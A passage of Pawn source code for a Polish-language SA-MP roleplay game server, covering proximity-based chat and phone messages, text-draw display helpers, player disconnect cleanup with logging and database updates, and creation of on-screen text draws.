		new temp[16]; format(temp, sizeof(temp), "%d", slot);
		new playermsg[128]; format(playermsg, sizeof(playermsg), text);
		strdel(playermsg, 0, strfind(playermsg,temp,true)+1);
		new msg[128];
		for(new i; i<=GetPlayerPoolSize(); i++)
		{
			if(IsPlayerConnected(i))
			{
				if(PlayerCache[i][pUID])
				{
					if(PlayerCache[i][pGroup] == groupuid)
					{
						format(msg, sizeof(msg), "{%s}@1 %s (( %d.%s:%s ))",GroupCache[groupuid][gColor], GroupCache[groupuid][gName], playerid, strreplace(ReturnPlayerName(playerid), '_', ' '), playermsg);
						SendClientMessage(i, -1, msg);
					}
					else if(PlayerCache[i][pGroup2] == groupuid)
					{
						format(msg, sizeof(msg), "{%s}@2 %s (( %d.%s:%s ))",GroupCache[groupuid][gColor], GroupCache[groupuid][gName], playerid, strreplace(ReturnPlayerName(playerid), '_', ' '), playermsg);
						SendClientMessage(i, -1, msg);
					}
					else if(PlayerCache[i][pGroup3] == groupuid)
					{
						format(msg, sizeof(msg), "{%s}@3 %s (( %d.%s:%s ))",GroupCache[groupuid][gColor], GroupCache[groupuid][gName], playerid, strreplace(ReturnPlayerName(playerid), '_', ' '), playermsg);
						SendClientMessage(i, -1, msg);
					}
				}
			}
		}
		return 0;
	}
	if(text[0] == '!')
	{
		new slot;
		if(text[1] == '1')
		{
			slot=1;
		}
		else if(text[1] == '2')
		{
			slot =2;
		}
		else if(text[1] == '3')
		{
			slot =3;
		}
		else
		{
			slot = 0;
		}
		if(slot < 1 || slot > 3)
		return !SendClientMessage(playerid, COLOR_GRAY, "Nieprawid³owy slot grupowy.");

		new groupuid;

		switch(slot)
		{
			case 1:
			{
				if(GroupCache[PlayerCache[playerid][pGroup]][gChatIC] == false)
				return !SendClientMessage(playerid, COLOR_GRAY, "S³uchawka dla tej grupy jest wy³aczona.");
				groupuid = PlayerCache[playerid][pGroup];
			}
			case 2:
			{
				if(GroupCache[PlayerCache[playerid][pGroup2]][gChatIC] == false)
				return !SendClientMessage(playerid, COLOR_GRAY, "S³uchawka dla tej grupy jest wy³aczona.");
				groupuid = PlayerCache[playerid][pGroup2];
			}
			case 3:
			{	
				if(GroupCache[PlayerCache[playerid][pGroup3]][gChatIC] == false)
				return !SendClientMessage(playerid, COLOR_GRAY, "S³uchawka dla tej grupy jest wy³aczona.");
				groupuid = PlayerCache[playerid][pGroup3];
			}
		}
		new temp[16]; format(temp, sizeof(temp), "%d", slot);
		new playermsg[128]; format(playermsg, sizeof(playermsg), text);
		strdel(playermsg, 0, strfind(playermsg,temp,true)+1);
		new msg[128];
		new msg2[128];
		format(msg2, sizeof(msg2), "%s (s³uchawka): %s", strreplace(ReturnPlayerName(playerid), '_', ' '), playermsg);
		new vw = GetPlayerVirtualWorld(playerid);
		for(new i; i<=GetPlayerPoolSize(); i++)
		{
			if(IsPlayerConnected(i))
			{
				if(PlayerCache[i][pUID])
				{
					if(PlayerCache[i][pGroup] == groupuid)
					{
						format(msg, sizeof(msg), "{%s}!1 %s ** %s:%s **",GroupCache[groupuid][gColor], GroupCache[groupuid][gName], strreplace(ReturnPlayerName(playerid), '_', ' '), playermsg);
						SendClientMessage(i, -1, msg);
					}
					else if(PlayerCache[i][pGroup2] == groupuid)
					{
						format(msg, sizeof(msg), "{%s}!2 %s ** %s:%s **",GroupCache[groupuid][gColor], GroupCache[groupuid][gName], strreplace(ReturnPlayerName(playerid), '_', ' '), playermsg);
						SendClientMessage(i, -1, msg);
					}
					else if(PlayerCache[i][pGroup3] == groupuid)
					{
						format(msg, sizeof(msg), "{%s}!3 %s ** %s:%s **",GroupCache[groupuid][gColor], GroupCache[groupuid][gName], strreplace(ReturnPlayerName(playerid), '_', ' '), playermsg);
						SendClientMessage(i, -1, msg);
					}
					else
					{
						new Float:X, Float:Y, Float:Z;
						GetPlayerPos(playerid, X, Y, Z);
						if(GetPlayerVirtualWorld(i) == vw)
						{
							if(IsPlayerInRangeOfPoint(i, 1, X, Y, Z))
							{
								if(PlayerCache[i][pBW_Time] > 0)
								{
									SendClientMessage(i, ME_SHADE_1, "Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
									continue;
								}
								SendFormattedMessage(i, msg2, "{B992C3}", "{EEEEEE}", CHAT_SHADE_1);
							}
							else if(IsPlayerInRangeOfPoint(i, 2, X, Y, Z))
							{
								if(PlayerCache[i][pBW_Time] > 0)
								{
									SendClientMessage(i, ME_SHADE_2, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
									continue;
								}
								SendFormattedMessage(i, msg2, "{AC79A7}", "{C8C8C8}", CHAT_SHADE_2);
							}
							else if(IsPlayerInRangeOfPoint(i, 3, X, Y, Z))
							{
								if(PlayerCache[i][pBW_Time] > 0)
								{
									SendClientMessage(i, ME_SHADE_3, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
									continue;
								}
								SendFormattedMessage(i, msg2, "{AC7998}", "{B4B4B4}", CHAT_SHADE_3);
							}
							else if(IsPlayerInRangeOfPoint(i, 6, X, Y, Z))
							{
								if(PlayerCache[i][pBW_Time] > 0)
								{
									SendClientMessage(i, ME_SHADE_4, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
									continue;
								}
								SendFormattedMessage(i, msg, "{AC6798}", "{8C8C8C}", CHAT_SHADE_4);
							}
							else if(IsPlayerInRangeOfPoint(i,12, X, Y, Z))
							{
								if(PlayerCache[i][pBW_Time] > 0)
								{
									SendClientMessage(i, ME_SHADE_5, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
									continue;
								}
								SendFormattedMessage(i, msg2, "{976798}", "{787878}", CHAT_SHADE_5);
							}
							else if(IsPlayerInRangeOfPoint(i, 18, X, Y, Z))
							{
								if(PlayerCache[i][pBW_Time] > 0)
								{
									SendClientMessage(i, ME_SHADE_6, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
									continue;
								}
								SendFormattedMessage(i, msg2, "{936583}", "{505050}", CHAT_SHADE_6);
							}
						}
					}
				}
			}
		}
		return 0;
	}*/
	if(text[0] == '.' && text[1] != ' ')
	{
		new finalmsg[256], playermsg[128];
		format(playermsg, sizeof(playermsg), text);
		strdel(playermsg, 0, 1);
		format(finalmsg, sizeof(finalmsg), "(( %s ))", playermsg);
		SetPlayerChatBubble(playerid, finalmsg, COLOR_WHITE, 12.0, 5000);
		if(!PlayerCache[playerid][pOOC])
		{
			format(finalmsg, sizeof(finalmsg), "(( Wys³ano OOC: %s ))", playermsg);
			SendClientMessage(playerid, COLOR_WHITE, finalmsg); TextDrawForPlayerEx(playerid, 1, "Mozesz poprzedzic swoja wypowiedz kropka.~n~Np. .Elo", 5000);
		}
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X, Y, Z);
		for(new i; i<=GetPlayerPoolSize(); i++)
		{
			if(IsPlayerConnected(i))
			{
				if(PlayerCache[i][pOOC])
				{
					if(IsPlayerInRangeOfPoint(i, 12.0, X, Y, Z) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i))
					SendClientMessage(i, COLOR_WHITE, finalmsg);
				}
			}
		}
		return 0;
	}
	if(aduty[playerid] != 0)
	{
		new msg[128];
		format(msg, sizeof(msg), "%s%s"HEX_WHITE": %s",GetHexRankColor(PlayerCache[playerid][pLevel]),ReturnPlayerName(playerid), text);
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X, Y, Z);
		new vw = GetPlayerVirtualWorld(playerid);
		for(new i=0; i<=GetPlayerPoolSize(); i++)
		{
			if(IsPlayerConnected(i))
			{
				if(GetPlayerVirtualWorld(i) == vw)
				{
					if(IsPlayerInRangeOfPoint(i, 20.0, X, Y, Z))
					SendClientMessage(i, -1, msg);
				}
			}
		}
		return 0;
	}
	new msg[128];
	text[0] = toupper(text[0]);
	format(msg, sizeof(msg), "%s mówi: %s", strreplace(ReturnPlayerName(playerid), '_', ' '), text);
	if(pTalking[playerid] != -1)
	format(msg, sizeof(msg), "%s (telefon): %s", strreplace(ReturnPlayerName(playerid), '_', ' '), text);
	new Float:range=1;
	new Float:range2=2;
	new Float:range3=3;
	new Float:range4=6;
	new Float:range5=12;
	new Float:range6=18;
	if(msg[strlen(msg)-1] == '!' && msg[strlen(msg)-2] == '!')
	{
		ApplyAnimation(playerid, "ON_LOOKERS","shout_01", 4.1, 0, 0, 0, 0, 0);
		format(msg, sizeof(msg), "%s krzyczy: %s", strreplace(ReturnPlayerName(playerid), '_', ' '), text);
		SendPlayerMe(playerid, "krzyczy.");
		range*=2;
		range2*=2;
		range3*=2;
		range4*=2;
		range5*=2;
		range6*=2;
	}
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	new vw = GetPlayerVirtualWorld(playerid);
	for(new i=0; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(GetPlayerVirtualWorld(i) == vw)
			{
				if(i == playerid && pTalking[playerid] != -1)
				continue;
				if(IsPlayerInRangeOfPoint(i, range, X, Y, Z))
				{
					if(PlayerCache[i][pBW_Time] > 0)
					{
						SendClientMessage(i, ME_SHADE_1, "Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
						continue;
					}
					SendFormattedMessage(i, msg, "{B992C3}", "{EEEEEE}", CHAT_SHADE_1);
				}
				else if(IsPlayerInRangeOfPoint(i, range2, X, Y, Z))
				{
					if(PlayerCache[i][pBW_Time] > 0)
					{
						SendClientMessage(i, ME_SHADE_2, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
						continue;
					}
					SendFormattedMessage(i, msg, "{AC79A7}", "{C8C8C8}", CHAT_SHADE_2);
				}
				else if(IsPlayerInRangeOfPoint(i, range3, X, Y, Z))
				{
					if(PlayerCache[i][pBW_Time] > 0)
					{
						SendClientMessage(i, ME_SHADE_3, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
						continue;
					}
					SendFormattedMessage(i, msg, "{AC7998}", "{B4B4B4}", CHAT_SHADE_3);
				}
				else if(IsPlayerInRangeOfPoint(i, range4, X, Y, Z))
				{
					if(PlayerCache[i][pBW_Time] > 0)
					{
						SendClientMessage(i, ME_SHADE_4, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
						continue;
					}
					SendFormattedMessage(i, msg, "{AC6798}", "{8C8C8C}", CHAT_SHADE_4);
				}
				else if(IsPlayerInRangeOfPoint(i,range5, X, Y, Z))
				{
					if(PlayerCache[i][pBW_Time] > 0)
					{
						SendClientMessage(i, ME_SHADE_5, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
						continue;
					}
					SendFormattedMessage(i, msg, "{976798}", "{787878}", CHAT_SHADE_5);
				}
				else if(IsPlayerInRangeOfPoint(i, range6, X, Y, Z))
				{
					if(PlayerCache[i][pBW_Time] > 0)
					{
						SendClientMessage(i, ME_SHADE_6, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
						continue;
					}
					SendFormattedMessage(i, msg, "{936583}", "{505050}", CHAT_SHADE_6);
				}
			}
		}
	}
	if(pTalking[playerid] != -1)
	{
		new talkerid = pTalking[playerid];
		if(PlayerCache[playerid][pGender])
		format(msg, sizeof(msg), "(%d, kobieta): %s", GetPlayerPhoneNumber(playerid)+50000, text);
		else
		format(msg, sizeof(msg), "(%d, mê¿czyzna): %s", GetPlayerPhoneNumber(playerid)+50000, text);
		SendClientMessage(talkerid, COLOR_YELLOW, msg);
		return !SendClientMessage(playerid, COLOR_YELLOW, msg);
	}
	return 0;
}

stock SendActorMessageInRange(actorid,  const msg[])
{
	new Float:X, Float:Y, Float:Z;
	GetActorPos(actorid, X, Y, Z);
	new vw = GetActorVirtualWorld(actorid);
	for(new i=0; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(GetPlayerVirtualWorld(i) == vw)
			{
				if(IsPlayerInRangeOfPoint(i, 2.0, X, Y, Z))
				{
					SendClientMessage(i, CHAT_SHADE_1, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 4.0, X, Y, Z))
				{
					SendClientMessage(i, CHAT_SHADE_2, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 6.0, X, Y, Z))
				{
					SendClientMessage(i, CHAT_SHADE_3, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 8.0, X, Y, Z))
				{
					SendClientMessage(i, CHAT_SHADE_4, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 10.0, X, Y, Z))
				{
					SendClientMessage(i, CHAT_SHADE_5, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 12.0, X, Y, Z))
				{
					SendClientMessage(i, CHAT_SHADE_6, msg);
				}
			}
		}
	}
}

stock SendPlayerMessageInRange(playerid, const text[], color, color2, color3, color4, color5, color6, bool:skipPlayerid)
{
	new msg[128]; format(msg, sizeof(msg), text);
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	new vw = GetPlayerVirtualWorld(playerid);
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(skipPlayerid)
			{
				if(i == playerid)
				continue;
			}
			if(GetPlayerVirtualWorld(i) == vw)
			{
				if(IsPlayerInRangeOfPoint(i, 1.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[128], temp2[128];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, color, temp1);
						SendClientMessage(i, color, temp2);
						continue;
					}
					SendClientMessage(i, color, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 4.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[128], temp2[128];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, color2, temp1);
						SendClientMessage(i, color, temp2);
						continue;
					}
					SendClientMessage(i, color2, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 8.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[128], temp2[128];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, color3, temp1);
						SendClientMessage(i, color3, temp2);
						continue;
					}
					SendClientMessage(i, color3, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 12.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[128], temp2[128];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, color4, temp1);
						SendClientMessage(i, color4, temp2);
						continue;
					}
					SendClientMessage(i, color4, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 16.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[128], temp2[128];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, color5, temp1);
						SendClientMessage(i, color5, temp2);
						continue;
					}
					SendClientMessage(i, color5, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 20.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[128], temp2[128];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, color6, temp1);
						SendClientMessage(i, color6, temp2);
						continue;
					}
					SendClientMessage(i, color6, msg);
				}
			}
		}
	}
	return 1;
}

stock strreplace(const string[], find, replace)
{
	new str[128];
	format(str, sizeof(str), string);
	for(new i = 0; i < strlen(str); i++)
	{
		if(str[i] == find)
		{
			str[i] = replace;
		}
	}
	return str;
}

stock ClearChat(playerid)
{
	for(new i=0; i<21; i++)
	{
		SendClientMessage(playerid, 0, " ");
	}
}

stock TextDrawForPlayerEx(playerid, textdrawid, const text[], time)
{
	switch(textdrawid)
	{
		case 0: {PlayerTextDrawSetString(playerid, ObjectInfo[playerid], text); PlayerTextDrawShow(playerid, ObjectInfo[playerid]); ObjectInfoTimer[playerid]=SetTimerEx("HideTextDrawForPlayerEx", time, false, "iii", playerid, 0, time);}
		case 1: {PlayerTextDrawSetString(playerid, RadarTextDraw[playerid], text); PlayerTextDrawShow(playerid, RadarTextDraw[playerid]); RadarTextDrawTimer[playerid]=SetTimerEx("HideTextDrawForPlayerEx", time, false, "iii", playerid, 1, time);}
		case 2: {PlayerTextDrawSetString(playerid, TextDrawDoorInfo[playerid], text); PlayerTextDrawShow(playerid, TextDrawDoorInfo[playerid]); DoorInfoTextTimer[playerid]=SetTimerEx("HideTextDrawForPlayerEx", time, false, "iii", playerid, 2, time);}
		case 3: {PlayerTextDrawSetString(playerid, PlayerAction[playerid], text); PlayerTextDrawShow(playerid, PlayerAction[playerid]); PlayerActionTimer[playerid]=SetTimerEx("HideTextDrawForPlayerEx", time, false, "iii", playerid, 3, time);}
	}
	return 1;
}

stock TextDrawForPlayer(playerid, const textdrawid, const text[])
{
	switch(textdrawid)
	{
		case 0: {PlayerTextDrawSetString(playerid, BottomTextDraw[playerid], text); PlayerTextDrawShow(playerid, BottomTextDraw[playerid]);}
		case 1: {PlayerTextDrawSetString(playerid, RadarTextDraw[playerid], text); PlayerTextDrawShow(playerid, RadarTextDraw[playerid]);}
		case 2: {PlayerTextDrawSetString(playerid, BWTextDraw[playerid], text); PlayerTextDrawShow(playerid, BWTextDraw[playerid]);}
		case 3: {PlayerTextDrawSetString(playerid, AJTextDraw[playerid], text); PlayerTextDrawShow(playerid, AJTextDraw[playerid]);}
	}
}

stock HideTextDrawForPlayer(playerid, textdrawid)
{
	switch(textdrawid)
	{
		case 0: PlayerTextDrawHide(playerid, BottomTextDraw[playerid]);
		case 1: PlayerTextDrawHide(playerid, RadarTextDraw[playerid]);
		case 2: PlayerTextDrawHide(playerid, BWTextDraw[playerid]);
		case 3: PlayerTextDrawHide(playerid, AJTextDraw[playerid]);
	}
}

forward HideTextDrawForPlayerEx(playerid, textdrawid, time);
public HideTextDrawForPlayerEx(playerid, textdrawid, time)
{
	switch(textdrawid)
	{
		case 0: PlayerTextDrawHide(playerid, ObjectInfo[playerid]); 
		case 1: PlayerTextDrawHide(playerid, RadarTextDraw[playerid]); 
		case 2: PlayerTextDrawHide(playerid, TextDrawDoorInfo[playerid]);
		case 3: PlayerTextDrawHide(playerid, PlayerAction[playerid]);
	}
	return 1;
}

forward HideIt(playerid);
public HideIt(playerid)
{
	DestroyDynamic3DTextLabel(pText[playerid]);
	pText[playerid] = Text3D:0;
}

public OnPlayerDisconnect(playerid, reason)
{
	KillTimer(pDetonatorTimer[playerid]);
	pDetonatorTimer[playerid] = 0;
	KillTimer(pClotchesTimer[playerid]);
	pMessageCount[playerid] = 0;
	pCommandCount[playerid] = 0;
	KillTimer(BusTimer[playerid]);
	godmodecount[playerid]=0;
	LoginAttempt[playerid] = 0;

	for(new i=0; i<10; i++)
	{
		if(IsPlayerAttachedObjectSlotUsed(playerid, i))
		RemovePlayerAttachedObject(playerid, i);
	}

	if(pLogged[playerid])
	{	
		new str[128];
		format(str, sizeof(str), "[LOG] [LEAVE] SAMP_NAME: %s, SAMP_ID: %d, CLIENT_IP: %s", ReturnPlayerName(playerid), playerid, PlayerIP(playerid));
		CreateLog(LOG_TYPE_GAME_CONNECTION, playerid, str, 0);

		if(pTrainingTimer[playerid])
		{
			KillTimer(pTrainingTimer[playerid]);
			pTrainingTimer[playerid] = 0;
			pTrainingState[playerid] = 0;
			pTrainingExtrude[playerid] = 0;
			pHoldingBar[playerid] = 0;
		}
		for(new i; i<MAX_ITEMS; i++)
		{
			if(ItemCache[i][iState] == ITEM_STATE_DRIVING)
			{
				if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
				{
					ItemCache[i][iOwner] = 0;
					DestroyDynamicMapIcon(pMapIcon[playerid]);
					pGetPack[i] = false;
				}
			}
		}
		new msg[128]; format(msg, sizeof(msg), "%s\n(( %s ))", RPName(playerid), GetQuitReason(reason));
		new Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y, Z);
		pText[playerid] = CreateDynamic3DTextLabel(msg, PLAYER_NORMAL_COLOR,X, Y,Z, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, GetPlayerVirtualWorld(playerid), 0, -1);
		SetTimerEx("HideIt", 1000*10, false, "i", playerid);
		if(pGPSTimer[playerid])
		{
			KillTimer(pGPSTimer[playerid]);
			pGPSTimer[playerid] = 0;
		}
		if(pTalking[playerid] != -1)
		{
			SetPlayerSpecialAction(pTalking[playerid], SPECIAL_ACTION_STOPUSECELLPHONE);
			pTalking[playerid] = -1;
		}
		pBelts[playerid] = false;
		if(PlayerCache[playerid][pAJ_Time] == 0)
		{
			GetPlayerPos(playerid, PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ]); 
			PlayerCache[playerid][pPosVW] = GetPlayerVirtualWorld(playerid);
		}
		KillTimer(PlayerRepairingVehicle[playerid][repairTimer]);
		DestroyDynamic3DTextLabel(pDesc[playerid][dID]); // Destroy his description
		pDesc[playerid][dID] = Text3D:0;
		pDesc[playerid][dIsDescOnPlayer] = false;

		new query[128];

		for(new i; i<MAX_ITEMS; i++)
		{
			if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
			{
				if(ItemCache[i][iActive])
				{
					if(ItemCache[i][iType] != 2)
					{
						if(ItemCache[i][iType] == 1)
						ResetPlayerWeapons(playerid);
						ItemCache[i][iActive]=0;
						format(query, sizeof(query), "UPDATE items SET active = '0' WHERE uid = '%d'", i);
						mysql_query(DB_HANDLE, query);
					}
				}
			}
		}
		ObjectCache[playerid][oUID] = 0;
		// Clear phone calling
		if(CallData[playerid][cCaller] != -1 && !CallData[playerid][cCalling])
		{
			new callerid = CallData[playerid][cCaller];
			SetPlayerSpecialAction(callerid, 13);
			SendClientMessage(callerid, -1, "Rozmówca roz³¹czy³ siê.");
			CallData[callerid][cCaller] = -1;
		}
		CallData[playerid][cCalling] = 0;
		CallData[playerid][cCaller] = -1;
		pDuty[playerid] = 0;
		pChoosingTxd[playerid] = 0;
		aduty[playerid] = 0;
		ac[playerid] = false;
		SetTimerEx("ClearPos", 60000*10, false, "i", PlayerCache[playerid][pUID]);
	}
	return 1;
}

forward ClearPos(puid);
public ClearPos(puid)
{
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerCache[i][pUID] == puid)
			return 1;
		}
	}

	new query[256];
	format(query, sizeof(query), "UPDATE players SET posX = %f, posY = %f, posZ = %f WHERE uid = %d", 0.0, 0.0, 0.0, puid);
	mysql_query(DB_HANDLE, query);

	return 1;
}

stock CreatePlayerTextDraws(playerid)
{

	PlayerAction[playerid] = CreatePlayerTextDraw(playerid, 149.443634, 422.166656, "Spozywa cheesburger");
	PlayerTextDrawLetterSize(playerid, PlayerAction[playerid], 0.218681, 1.168330);
	PlayerTextDrawAlignment(playerid, PlayerAction[playerid], 1);
	PlayerTextDrawColor(playerid, PlayerAction[playerid], -1);
	PlayerTextDrawSetShadow(playerid, PlayerAction[playerid], 0);
	PlayerTextDrawSetOutline(playerid, PlayerAction[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, PlayerAction[playerid], 35);
	PlayerTextDrawFont(playerid, PlayerAction[playerid], 1);
	PlayerTextDrawSetProportional(playerid, PlayerAction[playerid], 1);
	PlayerTextDrawSetShadow(playerid, PlayerAction[playerid], 0);

	VehicleInfo[playerid] = CreatePlayerTextDraw(playerid, 505.519317, 390.666748, "Predkosc: ~y~0 km/h~n~~w~Paliwo: ~y~100/100");
	PlayerTextDrawLetterSize(playerid, VehicleInfo[playerid], 0.217274, 0.940831);
	PlayerTextDrawTextSize(playerid, VehicleInfo[playerid], 642.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, VehicleInfo[playerid], 1);
	PlayerTextDrawColor(playerid, VehicleInfo[playerid], -1);
	PlayerTextDrawUseBox(playerid, VehicleInfo[playerid], 1);
	PlayerTextDrawBoxColor(playerid, VehicleInfo[playerid], 20);
	PlayerTextDrawSetShadow(playerid, VehicleInfo[playerid], 0);
	PlayerTextDrawSetOutline(playerid, VehicleInfo[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, VehicleInfo[playerid], 36);
	PlayerTextDrawFont(playerid, VehicleInfo[playerid], 1);
	PlayerTextDrawSetProportional(playerid, VehicleInfo[playerid], 1);
	PlayerTextDrawSetShadow(playerid, VehicleInfo[playerid], 0);

	BottomTextDraw[playerid] = CreatePlayerTextDraw(playerid, 506.927429, 301.416564, "Kradziez pojazdu.~n~Rozpoczynasz ~r~~h~kradziez pojazdu~w~. Czekaj cierpliwie do konca kradziezy.~n~~n~Kliknij ~y~LPM~w~ aby anl");
	PlayerTextDrawLetterSize(playerid, BottomTextDraw[playerid],  0.229453, 1.389969);
	PlayerTextDrawTextSize(playerid, BottomTextDraw[playerid], 0.000000, 239.000000);
	PlayerTextDrawAlignment(playerid, BottomTextDraw[playerid], 2);
	PlayerTextDrawColor(playerid, BottomTextDraw[playerid], -1);
	PlayerTextDrawUseBox(playerid, BottomTextDraw[playerid], 1);
	PlayerTextDrawBoxColor(playerid, BottomTextDraw[playerid], 43);
	PlayerTextDrawSetShadow(playerid, BottomTextDraw[playerid], 0);
	PlayerTextDrawSetOutline(playerid, BottomTextDraw[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, BottomTextDraw[playerid], 255);
	PlayerTextDrawFont(playerid, BottomTextDraw[playerid], 1);
	PlayerTextDrawSetProportional(playerid, BottomTextDraw[playerid], 1);
	PlayerTextDrawSetShadow(playerid, BottomTextDraw[playerid], 0);

	RadarTextDraw[playerid] = CreatePlayerTextDraw(playerid, 549.561157, 110.083229, " ");
	PlayerTextDrawLetterSize(playerid, RadarTextDraw[playerid], 0.187400, 1.156649);
	PlayerTextDrawTextSize(playerid, RadarTextDraw[playerid],0.099999, 130.000000);
	PlayerTextDrawAlignment(playerid, RadarTextDraw[playerid], 2);
	PlayerTextDrawColor(playerid, RadarTextDraw[playerid], -1);
	PlayerTextDrawUseBox(playerid, RadarTextDraw[playerid], 1);
	PlayerTextDrawBoxColor(playerid, RadarTextDraw[playerid], 20);
	PlayerTextDrawSetShadow(playerid, RadarTextDraw[playerid], 0);
	PlayerTextDrawSetOutline(playerid, RadarTextDraw[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, RadarTextDraw[playerid], 20);
	PlayerTextDrawFont(playerid, RadarTextDraw[playerid], 1);
	PlayerTextDrawSetProportional(playerid,RadarTextDraw[playerid], 1);
	PlayerTextDrawSetShadow(playerid, RadarTextDraw[playerid], 0);

	TextDrawDoorInfo[playerid] = CreatePlayerTextDraw(playerid,499.429382, 328.833404, " ");
	PlayerTextDrawLetterSize(playerid, TextDrawDoorInfo[playerid], 0.212582, 1.209139);
	PlayerTextDrawTextSize(playerid, TextDrawDoorInfo[playerid], 0.000000, 151.000000);
	PlayerTextDrawAlignment(playerid, TextDrawDoorInfo[playerid], 2);
	PlayerTextDrawColor(playerid, TextDrawDoorInfo[playerid], -1);
	PlayerTextDrawUseBox(playerid, TextDrawDoorInfo[playerid], 1);
	PlayerTextDrawBoxColor(playerid, TextDrawDoorInfo[playerid], 28);
	PlayerTextDrawSetShadow(playerid, TextDrawDoorInfo[playerid], 0);
	PlayerTextDrawSetOutline(playerid, TextDrawDoorInfo[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, TextDrawDoorInfo[playerid], 30);
	PlayerTextDrawFont(playerid, TextDrawDoorInfo[playerid], 1);
	PlayerTextDrawSetProportional(playerid, TextDrawDoorInfo[playerid], 1);
	PlayerTextDrawSetShadow(playerid, TextDrawDoorInfo[playerid], 0);

	BWTextDraw[playerid] = CreatePlayerTextDraw(playerid, 319.517089, 396.500091, "Stan nieprzytomnosci przez: 10 min");
	PlayerTextDrawLetterSize(playerid, BWTextDraw[playerid], 0.204625, 1.028332);
	PlayerTextDrawTextSize(playerid, BWTextDraw[playerid], 0.000000, 158.000000);
	PlayerTextDrawAlignment(playerid, BWTextDraw[playerid], 2);
	PlayerTextDrawColor(playerid, BWTextDraw[playerid], -1);
	PlayerTextDrawUseBox(playerid, BWTextDraw[playerid], 1);
	PlayerTextDrawBoxColor(playerid, BWTextDraw[playerid],-16711642);
	PlayerTextDrawSetShadow(playerid, BWTextDraw[playerid], 0);
	PlayerTextDrawSetOutline(playerid, BWTextDraw[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, BWTextDraw[playerid], 255);
	PlayerTextDrawFont(playerid, BWTextDraw[playerid], 1);
	PlayerTextDrawSetProportional(playerid, BWTextDraw[playerid], 1);
	PlayerTextDrawSetShadow(playerid, BWTextDraw[playerid], 0);


